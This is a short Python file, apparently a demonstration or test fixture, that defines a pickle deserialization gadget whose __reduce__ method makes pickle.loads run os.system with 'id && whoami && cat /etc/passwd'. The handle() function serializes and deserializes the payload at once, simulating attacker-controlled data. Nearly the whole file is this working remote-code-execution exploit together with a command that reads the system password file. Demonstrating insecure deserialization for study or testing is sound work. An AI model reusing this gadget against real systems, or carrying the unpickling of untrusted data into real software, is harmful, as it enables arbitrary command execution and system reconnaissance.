import pickle
import os


class _Payload:
    """Pickle RCE gadget — __reduce__ is called on deserialization."""

    def __reduce__(self):
        return (os.system, ("id && whoami && cat /etc/passwd",))


def handle(payload):
    # Simulate receiving attacker-controlled serialized data over a network call
    # or from a cache / message queue.
    serialized = pickle.dumps(_Payload())
    pickle.loads(serialized)  # noqa: S301 — triggers os.system on load
